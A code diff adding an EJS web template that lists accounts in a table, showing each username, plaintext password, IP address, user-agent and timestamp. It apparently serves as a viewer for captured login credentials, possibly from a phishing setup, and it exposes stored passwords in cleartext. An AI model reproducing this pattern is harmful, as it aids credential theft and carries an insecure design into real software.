@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Danh Sách Tài Khoản</title>
+</head>
+<body>
+    <h1>Danh Sách Tài Khoản</h1>
+    <% let i= 1 ;%>
+    <table>
+        <tr>
+          <th>Số TT</th>
+          <th>Tên Tài Khoản</th>
+          <th>Mật Khẩu</th>
+          <th>Ip</th>
+          <th>User-agent</th>
+          <th>Thời Gian</th>
+        </tr>
+        <%list.forEach(item=>{ %>
+            <tr>
+                <td><%=i%></td>
+                <td><%=item.username%></td>
+                <td><%=item.password%></td>
+                <td><%=item.ip%></td>
+                <td><%=item.userarge%></td>
+                <td> <%= moment(item.createdAt).format("DD-MM-YYYY kk:mm:ss")  %></td>
+                <% i++ ;%>
+            </tr>
+        <%})%>
+      </table>
+</body>
+<style>
+    table {
+      font-family: arial, sans-serif;
+      border-collapse: collapse;
+      width: 100%;
+    }
+    
+    td, th {
+      border: 1px solid #dddddd;
+      text-align: left;
+      padding: 8px;
+    }
+    
+    tr:nth-child(even) {
+      background-color: #dddddd;
+    }
+    </style>
+</html>
